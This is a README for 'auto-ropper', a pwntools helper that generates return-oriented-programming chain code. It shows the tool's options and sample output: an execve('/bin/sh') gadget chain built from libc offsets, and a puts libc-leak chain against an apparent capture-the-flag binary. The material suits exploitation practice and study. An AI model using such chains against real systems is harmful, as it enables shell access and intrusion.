# auto-ropper
Trying to automatise creating code in pwntools for simple ROP chains

Usage examples:

Help:
```bash
usage: auto-ropper.py [-h] --elf ELF [--execve] [--read] [--readaddr READADDR] [--readcount READCOUNT] [--write] [--writeaddr WRITEADDR] [--writecount WRITECOUNT]
                      [--mprotect] [--mprotectaddr MPROTECTADDR] [--putsleak]

optional arguments:
  -h, --help            show this help message and exit
  --execve              Tries to create execve syscall
  --read                Tries to create read syscall
  --readaddr READADDR   Start address for read to use. If none specified, it uses the the start got.plt address + 0x500
  --readcount READCOUNT
                        Amount you would like to read
  --write               Tries to create write syscall
  --writeaddr WRITEADDR
                        Start address for write to use. If none specified, it uses the start got.plt address + 0x500
  --writecount WRITECOUNT
                        Amount you would like to write. If none specified 0x100
  --mprotect            Tries to create an mprotect syscall
  --mprotectaddr MPROTECTADDR
                        Address of section you would like to mprotect. If none specified it uses the start got.plt address + 0x500
  --putsleak            Tries to create a libc leak using puts

required named arguments:
  --elf ELF             The binary you would like to use
```

Creating execve pwntools code from libc:
```bash 
└─$ python3 auto-ropper.py --elf ./libc-2.28.so --execve                                                                                                           2 ⨯
[*] '/home/zopazz/Documents/autoropper/libc-2.28.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] Loaded 201 cached gadgets for './libc-2.28.so'
#Insert your padding here
padding = b""

#If you're looking for ROP gadgets from a leak insert your leak here
leak = 0x0

poprax = p64(leak + 0x3a638)
poprdi = p64(leak + 0x23a5f)
poprdx = p64(leak + 0x106725)
poprsi = p64(leak + 0x2440e)
binsh = p64(leak + 0x181519)
syscall = p64(leak + 0xb5b35)

execve = poprdi + binsh + poprsi + p64(0) + poprdx + p64(0) + poprax + p64(59) + syscall

```

Creating a puts leak from binary:
```bash
─$ python3 auto-ropper.py --elf ./ret2the-unknown --putsleak
[*] '/home/zopazz/Documents/autoropper/ret2the-unknown'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] Loaded 14 cached gadgets for './ret2the-unknown'
#Insert your padding here
padding = b""

#If you're looking for ROP gadgets from a leak insert your leak here
leak = 0x0

poprdi = p64(leak + 0x4012a3)
putsplt = p64(leak + 0x401074)
putsgot = p64(leak + 0x404018)
main = p64(leak + 0x401186)

puts_leak = poprdi + putsgot + putsplt + main
```
